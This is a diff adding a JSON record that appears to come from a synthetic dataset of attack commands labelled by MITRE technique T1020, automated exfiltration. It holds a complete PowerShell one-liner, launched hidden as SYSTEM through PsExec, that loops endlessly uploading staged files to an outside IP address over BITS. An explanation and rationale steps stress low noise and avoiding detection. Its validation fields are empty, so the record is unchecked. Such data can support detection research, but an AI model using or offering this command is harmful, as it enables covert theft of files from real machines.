@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; $sent='C:\\ProgramData\\.sent'; New-Item -ItemType Directory -Path $sent -Force | Out-Null; while ($true){ Get-ChildItem 'C:\\Intel\\staging' -File | ForEach-Object { try { $u='https://203.0.113.25/bits/' + $_.Name; Start-BitsTransfer -Source $_.FullName -Destination $u -TransferType Upload -Authentication NONE -Asynchronous | Out-Null; Move-Item -Force $_.FullName (Join-Path $sent $_.Name) } catch {} }; Start-Sleep 180 }\"",
+  "explanation": "Uses BITS to asynchronously upload staged files to an HTTPS endpoint and then relocates the originals. The loop provides automated, low-noise exfiltration.",
+  "rationale_steps": [
+    "Run as hidden SYSTEM via PSExec.",
+    "Enumerate files in a staging directory for upload.",
+    "Start asynchronous BITS upload jobs to reduce interactive noise.",
+    "Move files to a 'sent' folder after job initiation to avoid re-processing.",
+    "Pause between scans to minimize detection surface."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-ada9cba0",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
